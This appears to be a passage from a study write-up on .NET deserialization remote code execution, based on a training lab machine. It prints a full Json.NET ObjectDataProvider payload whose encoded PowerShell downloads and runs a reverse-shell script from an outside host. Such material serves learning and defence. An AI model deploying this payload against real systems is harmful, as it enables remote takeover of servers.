 # Deserialization - Object Instantiation for Remote Code Execution
 
I am currently studying Offensive Security Advanced Web Attacks and Exploitation (WEB-300). One of the sections in the curriculum is a Dot Net Nuke (DNN) deserialization vulnerability leading to code execution.

I have carried out some deserialization attacks before (all legal of course), and whilst I understand the concpet behind them I had never really thought about how the RCE occurs.

I decided to have a look at the underlying .Net objects to demonstrate what is happening under the hood once the deserialization has been carried out an the object has been instantiated.

Hopefully this will help others understand why code execution is achieved.

## JSON

The hack the box JSON machine is a perfect example to explain the underlying object instantiation. Without going in to too much detail the HTTP POST payload used to exploit JSON is shown below:

```json
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd','/c powershell.exe  -exec bypass -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4ANAAvAHIAZQB2AC4AcABzADEAIgApAA==']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```
